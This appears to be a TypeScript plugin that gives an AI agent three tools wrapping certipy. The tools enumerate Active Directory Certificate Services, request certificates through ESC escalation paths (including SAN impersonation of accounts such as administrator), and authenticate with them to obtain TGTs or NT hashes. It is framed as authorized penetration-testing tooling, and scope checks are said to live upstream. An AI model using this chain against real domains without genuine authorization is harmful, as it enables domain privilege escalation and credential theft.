/**
 * Model-facing ADCS collection and ESC exploitation tools. Registers
 * `adcs_find`, `adcs_req`, and `adcs_auth` on `ctx.tools` and shells out
 * through `ctx.subprocess`. `adcs_find` parses certipy's JSON stdout into
 * bounded certificate-authority and template rows; `adcs_req` performs one
 * ESC-path certificate request whose PFX artifact writes into a private
 * temporary directory and whose result carries the path plus the stdout
 * summary; `adcs_auth` authenticates with one PFX artifact and returns the
 * TGT or hash lines. The account secret is resolved from the model-provided
 * `credential_ref` at execution time and never appears in model-visible
 * arguments or the Session log.
 *
 * Authorization is enforced upstream by `assessment-scope-tool-policy`: the
 * tool name must be listed in that policy's `credentialTools`, the call must
 * carry a well-formed `credential_ref`, `target_id` must match a grant target,
 * and the mapped `credential-use` action must be granted with the presented
 * credential reference. The ESC exploitation pair additionally benefits from
 * an `exploit-execution` grant: deployments that list the action in
 * `approvalRequiredActions` turn every request or authentication into an
 * approval prompt. This package performs no scope checks of its own.
 *
 * @module @cinlan/tool-certipy
 */

import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Context } from '@deepseek-ai/cordis'
import { defineTool } from '@deepseek-ai/dsh-tools'
import type { JsonValue } from '@deepseek-ai/dsh-util-values'
import { credentialRef } from '@deepseek-ai/dsh-credentials'
import type { CredentialProvider } from '@deepseek-ai/dsh-credentials'
import { SubprocessExecutableNotFoundError } from '@deepseek-ai/dsh-subprocess'
import { buildCertipyAuthArgv, buildCertipyFindArgv, buildCertipyReqArgv, parseCertipyFind, parseCertipyLines } from './certipy.ts'
import type { CertifyAuthRequest, CertipyFindRequest, CertipyReqRequest } from './certipy.ts'

export const name = 'tool-certipy'
export const inject = ['tools', 'subprocess']

/** Deployment bounds for the certipy tool. */
export interface Config {
  /** Executable name or absolute path resolved through `ctx.subprocess`. Default `certipy`. */
  readonly command?: string
  /** Whole-run timeout in milliseconds; also the subprocess grace period. Default 300000. */
  readonly timeoutMs?: number
  /** Maximum UTF-8 bytes in the serialized tool result. Default 262144. */
  readonly maxOutputBytes?: number
}

const DEFAULT_TIMEOUT_MS = 300_000
const DEFAULT_MAX_OUTPUT_BYTES = 262_144
const CONFIG_KEYS = new Set(['command', 'timeoutMs', 'maxOutputBytes'])

interface ResolvedConfig {
  readonly command: string
  readonly timeoutMs: number
  readonly maxOutputBytes: number
}

function resolveConfig(config: Config): ResolvedConfig {
  for (const key of Object.keys(config)) {
    if (!CONFIG_KEYS.has(key)) throw new TypeError(`tool-certipy: unsupported config key ${JSON.stringify(key)}`)
  }
  const resolved = {
    command: config.command ?? 'certipy',
    timeoutMs: config.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    maxOutputBytes: config.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES,
  }
  if (resolved.command.trim().length === 0) throw new TypeError('tool-certipy: command must be non-empty')
  if (!Number.isSafeInteger(resolved.timeoutMs) || resolved.timeoutMs < 1_000 || resolved.timeoutMs > 3_600_000) {
    throw new TypeError('tool-certipy: timeoutMs must be an integer between 1000 and 3600000')
  }
  if (!Number.isSafeInteger(resolved.maxOutputBytes) || resolved.maxOutputBytes < 1) {
    throw new TypeError('tool-certipy: maxOutputBytes must be a positive safe integer')
  }
  return resolved
}

function enforceResultBytes(value: unknown, maxBytes: number): void {
  const bytes = Buffer.byteLength(JSON.stringify(value), 'utf8')
  if (bytes > maxBytes) {
    throw new Error(`tool-certipy: complete result is ${bytes} bytes; limit is ${maxBytes}`)
  }
}

/** Resolve the presented credential reference into its secret value. */
async function resolvePassword(ctx: Context, ref: string): Promise<string> {
  const provider: CredentialProvider | undefined = ctx.get('credentials')
  if (provider === undefined) {
    throw new Error('tool-certipy: no credential provider is mounted; mount one (e.g. @deepseek-ai/dsh-credentials-local).')
  }
  const resolved = await provider.resolve(credentialRef(ref))
  if (resolved === undefined) {
    throw new Error(`tool-certipy: credential ${ref} is not configured.`)
  }
  return resolved.value
}

function optionalString(value: unknown): string | undefined {
  return typeof value === 'string' && value.length > 0 ? value : undefined
}

/**
 * Register the `adcs_find` tool on `ctx.tools`.
 * @param ctx - registrant context carrying the tool registry and subprocess runtime.
 * @param config - deployment bounds for command, timeout, and output size.
 */
export function apply(ctx: Context, config: Config = {}): void {
  const resolved = resolveConfig(config)

  ctx.tools.register(defineTool({
    name: 'adcs_find',
    description:
      'Collect Active Directory Certificate Services configuration from one authorized '
      + 'assessment domain with an authenticated account (certipy find -stdout) and return '
      + 'certificate-authority and template rows. `-vulnerable` restricts the report to '
      + 'entries with known escalation paths (ESC classes). The domain must match a target '
      + 'declared in the active assessment-scope grant and the credential reference must be '
      + 'granted; this is read-only directory collection, not exploitation.',
    parameters: {
      target_id: {
        type: 'string',
        required: true,
        description: 'Domain to collect ADCS configuration from, as declared in the assessment scope grant (e.g. lab.example.invalid).',
      },
      username: {
        type: 'string',
        required: true,
        description: 'Authenticated account name whose granted credential performs the collection.',
      },
      credential_ref: {
        type: 'string',
        required: true,
        description: 'Environment-variable-shaped name of the granted credential secret (e.g. ASSESS_AD_PASS). The value never enters the conversation.',
      },
      dc_ip: {
        type: 'string',
        description: 'Domain controller address for -dc-ip.',
      },
      vulnerable_only: {
        type: 'boolean',
        description: 'Report only certificate authorities and templates with known escalation paths (-vulnerable).',
      },
    },
    output: {
      schema: {
        type: 'object',
        additionalProperties: false,
        properties: {
          cas: {
            type: 'array',
            required: true,
            items: { type: 'object', additionalProperties: true },
          },
          templates: {
            type: 'array',
            required: true,
            items: { type: 'object', additionalProperties: true },
          },
        },
      },
      render: (_args, value) => {
        const cas = value.cas as readonly { name?: string }[]
        const templates = value.templates as readonly { name?: string }[]
        const caNames = cas.slice(0, 20).map(row => row.name ?? '?')
        const templateNames = templates.slice(0, 50).map(row => row.name ?? '?')
        return [{
          type: 'text',
          text: `adcs: ${cas.length} CA(s) [${caNames.join(', ')}], ${templates.length} template(s)\n  ${templateNames.join('\n  ')}`,
        }]
      },
    },
    async execute(args, exec) {
      const refName = String(args.credential_ref)
      const password = await resolvePassword(ctx, refName)
      const request: CertipyFindRequest = {
        domain: String(args.target_id),
        username: String(args.username),
        password,
        credentialRef: refName,
        ...(optionalString(args.dc_ip) !== undefined ? { dcIp: String(args.dc_ip) } : {}),
        ...(args.vulnerable_only !== undefined ? { vulnerableOnly: args.vulnerable_only === true } : {}),
      }
      const argv = buildCertipyFindArgv(resolved.command, request)
      let certipyPath: string
      try {
        certipyPath = await ctx.subprocess.resolveExecutable(resolved.command, undefined, exec.signal)
      } catch (error) {
        if (error instanceof SubprocessExecutableNotFoundError) {
          throw new Error(`tool-certipy: certipy executable not found (${resolved.command}). Install certipy-adt or set config.command.`)
        }
        throw error
      }
      argv[0] = certipyPath
      const handle = ctx.subprocess.spawn({
        argv,
        cwd: tmpdir(),
        stdio: {
          stdin: 'ignore',
          stdout: { maxBytes: 33_554_432 },
          stderr: { maxBytes: 65_536 },
        },
        graceMs: resolved.timeoutMs,
        signal: exec.signal,
      })
      const outcome = await handle.done
      const stdout = handle.collected.stdout?.readFrom(0).text ?? ''
      const stderr = handle.collected.stderr?.readFrom(0).text ?? ''
      if (outcome.exitCode !== 0) {
        const detail = stderr.trim().length > 0 ? stderr.trim().slice(-500) : `exit code ${outcome.exitCode ?? 'signal ' + String(outcome.signal)}`
        throw new Error(`tool-certipy: certipy failed — ${detail}`)
      }
      const parsed = parseCertipyFind(stdout)
      const value = {
        cas: parsed.cas as unknown as Record<string, JsonValue>[],
        templates: parsed.templates as unknown as Record<string, JsonValue>[],
      }
      enforceResultBytes(value, resolved.maxOutputBytes)
      return value
    },
    presentCall: args => ({ card: 'generic', title: 'Collect ADCS configuration', kind: 'other', rawInput: args }),
  }))

  ctx.tools.register(defineTool({
    name: 'adcs_req',
    description:
      'Request one certificate through an ESC path found by adcs_find (certipy req) on one authorized '
      + 'assessment domain. The resulting PFX artifact writes into a private temporary directory and the '
      + 'result carries its absolute path plus certipy\'s summary lines; pair the artifact with adcs_auth '
      + 'to authenticate. This is exploit execution: the domain must match a target declared in the active '
      + 'assessment-scope grant, the credential reference must be granted, and deployments typically '
      + 'require approval for every call.',
    parameters: {
      target_id: {
        type: 'string',
        required: true,
        description: 'Domain to request the certificate from, as declared in the assessment scope grant (e.g. lab.example.invalid).',
      },
      username: {
        type: 'string',
        required: true,
        description: 'Authenticated account name whose granted credential performs the request.',
      },
      credential_ref: {
        type: 'string',
        required: true,
        description: 'Environment-variable-shaped name of the granted credential secret (e.g. ASSESS_AD_PASS). The value never enters the conversation.',
      },
      ca: {
        type: 'string',
        required: true,
        description: 'Certificate authority name to request from, as adcs_find reported it.',
      },
      template: {
        type: 'string',
        required: true,
        description: 'Certificate template name to request, as adcs_find reported it.',
      },
      san: {
        type: 'string',
        description: 'Subject Alternative Name to embed (ESC1 SAN specification, e.g. administrator@domain or a UPN).',
      },
      dc_ip: {
        type: 'string',
        description: 'Domain controller address for -dc-ip.',
      },
    },
    output: {
      schema: {
        type: 'object',
        additionalProperties: false,
        properties: {
          pfxPath: { type: 'string', required: true },
          lines: {
            type: 'array',
            required: true,
            items: { type: 'object', additionalProperties: true },
          },
        },
      },
      render: (_args, value) => {
        const rows = value.lines as readonly { text?: string }[]
        const summary = rows.slice(-6).map(row => row.text ?? '?').join('\n  ')
        return [{ type: 'text', text: `adcs req: artifact ${String(value.pfxPath)}\n  ${summary}` }]
      },
    },
    async execute(args, exec) {
      const refName = String(args.credential_ref)
      const password = await resolvePassword(ctx, refName)
      const request: CertipyReqRequest = {
        domain: String(args.target_id),
        username: String(args.username),
        password,
        credentialRef: refName,
        ca: String(args.ca),
        template: String(args.template),
        ...(optionalString(args.san) !== undefined ? { san: String(args.san) } : {}),
        ...(optionalString(args.dc_ip) !== undefined ? { dcIp: String(args.dc_ip) } : {}),
      }
      const dir = await mkdtemp(join(tmpdir(), 'tool-certipy-'))
      const argv = buildCertipyReqArgv(resolved.command, request, join(dir, 'requested.pfx'))
      let certipyPath: string
      try {
        certipyPath = await ctx.subprocess.resolveExecutable(resolved.command, undefined, exec.signal)
      } catch (error) {
        if (error instanceof SubprocessExecutableNotFoundError) {
          throw new Error(`tool-certipy: certipy executable not found (${resolved.command}). Install certipy-adt or set config.command.`)
        }
        throw error
      }
      argv[0] = certipyPath
      const handle = ctx.subprocess.spawn({
        argv,
        cwd: tmpdir(),
        stdio: {
          stdin: 'ignore',
          stdout: { maxBytes: 1_048_576 },
          stderr: { maxBytes: 65_536 },
        },
        graceMs: resolved.timeoutMs,
        signal: exec.signal,
      })
      const outcome = await handle.done
      const stdout = handle.collected.stdout?.readFrom(0).text ?? ''
      const stderr = handle.collected.stderr?.readFrom(0).text ?? ''
      if (outcome.exitCode !== 0) {
        const detail = stderr.trim().length > 0 ? stderr.trim().slice(-500) : `exit code ${outcome.exitCode ?? 'signal ' + String(outcome.signal)}`
        throw new Error(`tool-certipy: certipy req failed — ${detail}`)
      }
      const value = {
        pfxPath: join(dir, 'requested.pfx'),
        lines: parseCertipyLines(stdout) as unknown as Record<string, JsonValue>[],
      }
      enforceResultBytes(value, resolved.maxOutputBytes)
      return value
    },
    presentCall: args => ({ card: 'generic', title: 'Request an ESC-path certificate', kind: 'other', rawInput: args }),
  }))

  ctx.tools.register(defineTool({
    name: 'adcs_auth',
    description:
      'Authenticate with one PFX artifact from adcs_req (certipy auth) on one authorized assessment '
      + 'domain and return the resulting TGT or NT-hash summary lines. This is exploit execution: the '
      + 'domain must match a target declared in the active assessment-scope grant and deployments '
      + 'typically require approval for every call. The artifact path stays within this session\'s '
      + 'private temporary directory.',
    parameters: {
      target_id: {
        type: 'string',
        required: true,
        description: 'Domain the certificate authenticates against, as declared in the assessment scope grant.',
      },
      pfx_path: {
        type: 'string',
        required: true,
        description: 'Absolute PFX artifact path as adcs_req reported it.',
      },
      dc_ip: {
        type: 'string',
        description: 'Domain controller address for -dc-ip.',
      },
    },
    output: {
      schema: {
        type: 'object',
        additionalProperties: false,
        properties: {
          lines: {
            type: 'array',
            required: true,
            items: { type: 'object', additionalProperties: true },
          },
        },
      },
      render: (_args, value) => {
        const rows = value.lines as readonly { text?: string }[]
        const summary = rows.slice(-6).map(row => row.text ?? '?').join('\n  ')
        return [{ type: 'text', text: `adcs auth:\n  ${summary}` }]
      },
    },
    async execute(args, exec) {
      const request: CertifyAuthRequest = {
        pfxPath: String(args.pfx_path),
        ...(optionalString(args.dc_ip) !== undefined ? { dcIp: String(args.dc_ip) } : {}),
      }
      const argv = buildCertipyAuthArgv(resolved.command, request)
      let certipyPath: string
      try {
        certipyPath = await ctx.subprocess.resolveExecutable(resolved.command, undefined, exec.signal)
      } catch (error) {
        if (error instanceof SubprocessExecutableNotFoundError) {
          throw new Error(`tool-certipy: certipy executable not found (${resolved.command}). Install certipy-adt or set config.command.`)
        }
        throw error
      }
      argv[0] = certipyPath
      const handle = ctx.subprocess.spawn({
        argv,
        cwd: tmpdir(),
        stdio: {
          stdin: 'ignore',
          stdout: { maxBytes: 1_048_576 },
          stderr: { maxBytes: 65_536 },
        },
        graceMs: resolved.timeoutMs,
        signal: exec.signal,
      })
      const outcome = await handle.done
      const stdout = handle.collected.stdout?.readFrom(0).text ?? ''
      const stderr = handle.collected.stderr?.readFrom(0).text ?? ''
      if (outcome.exitCode !== 0) {
        const detail = stderr.trim().length > 0 ? stderr.trim().slice(-500) : `exit code ${outcome.exitCode ?? 'signal ' + String(outcome.signal)}`
        throw new Error(`tool-certipy: certipy auth failed — ${detail}`)
      }
      const value = { lines: parseCertipyLines(stdout) as unknown as Record<string, JsonValue>[] }
      enforceResultBytes(value, resolved.maxOutputBytes)
      return value
    },
    presentCall: args => ({ card: 'generic', title: 'Authenticate with a requested certificate', kind: 'other', rawInput: args }),
  }))
}
